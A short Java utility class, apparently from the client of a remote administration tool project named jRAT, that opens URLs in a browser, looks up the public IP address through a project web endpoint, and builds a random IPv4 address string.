package io.jrat.client.utils;

import io.jrat.client.Constants;
import io.jrat.client.ErrorDialog;
import io.jrat.client.net.WebRequest;

import java.awt.Desktop;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URI;


public class NetUtils {

	public static void openUrl(String str) {
		try {
			Desktop.getDesktop().browse(new URI(str));
		} catch (Exception ex) {
			ex.printStackTrace();
			ErrorDialog.create(ex);
		}
	}

	public static String getIP() throws Exception {
		HttpURLConnection uc = WebRequest.getConnection(Constants.HOST + "/getip.php");
		BufferedReader reader = new BufferedReader(new InputStreamReader(uc.getInputStream()));
		String ip = reader.readLine();
		reader.close();
		uc.disconnect();
		return ip;
	}

	public static String randomizeIP() {
		int i = (short) (int) (Math.random() * 256.0D);
		int j = (short) (int) (Math.random() * 256.0D);
		int k = (short) (int) (Math.random() * 256.0D);
		int m = (short) (int) (Math.random() * 256.0D);
		return i + "." + j + "." + k + "." + m;
	}

}
